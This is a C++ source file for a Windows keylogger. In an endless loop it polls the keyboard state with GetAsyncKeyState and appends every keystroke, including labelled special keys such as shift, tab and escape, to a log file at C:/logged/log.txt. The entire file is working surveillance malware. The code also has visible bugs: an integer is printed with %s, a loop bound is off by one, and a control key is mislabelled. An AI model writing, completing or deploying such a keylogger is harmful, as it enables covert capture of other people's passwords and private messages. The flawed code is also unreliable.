

#include <iostream>
#include<fstream>
#include <Windows.h>
#include <time.h>
#include <string>
#include "main.h"
#include "one_time_creation.h"
#include <vector>



#pragma warning(disable : 4996)

//^this disables the error message about the key saving method not being safe






//temp logging sytem

void logfile(int &key)
{
	//TODO: create a new path for the logging file
	
	FILE* log;
	log = fopen("C:/logged/log.txt", "a+");//a+ to create a file if it doesnt exist and writes at then end.
	fprintf(log, "%s", &key);
	fclose(log);
	
	
}


void special_keys_translte(int key)
{
	//a+ to create a file if it doesnt exist and writes at then end.
	FILE* log;
	log = fopen("C:/logged/log.txt", "a+");
	switch (key)
	{
	case VK_RSHIFT:

		fprintf(log, "[RSHIFT]"); //Right shif
		break;

	case VK_LSHIFT:
		fprintf(log, "[LSHIFT]");//Left shift
		break;

	case VK_LCONTROL:

		fprintf(log, "[LCONTROL]");//Left control
		break;

	case VK_CONTROL:
		fprintf(log, "[RCONTROL]");//Right control
		break;

	case VK_TAB:
		
		fprintf(log,  "[TAB]");//TAB;

		break;

	case VK_CAPITAL:

		fprintf(log,  "[CAPS]");//CAPS
		break;
	
	case VK_ESCAPE:

		fprintf(log,  "[ESC]");//ESC
		break;

	
		

	}
	fclose(log);

}


bool isSpecialkey(int key)
{
	
	int keys[] = { VK_RIGHT, VK_SHIFT, VK_TAB, VK_CONTROL, VK_LCONTROL, VK_CAPITAL, VK_ESCAPE };
	//						0		1		2			3			4			5			
	for (int i = 0; i <= sizeof(keys) / sizeof(keys[0]); i++)
	{
		if (key == keys[i])
		{
			return true;
		}

	}
	return false;

	
}








int main()
{


	path_creation();






	bool running = true;
	while (running == true)
	{
		//using ascii
		int i=0;
		for (i > 8; i <= 190; i++) // starts and end of the mainly used ascii char
		{

			bool result = isSpecialkey(i);
			if (result == true)
			{
				if (GetAsyncKeyState(i) & 0x8001)
				{
					special_keys_translte(i);
					std::cout << "w"<< std::endl;
				}

			}
			else if (GetAsyncKeyState(i) == -32767 && result == false)
			{
				logfile(i);
			}
		
			
		}
		Sleep(20);
	
	}	
		
	return 0;
}
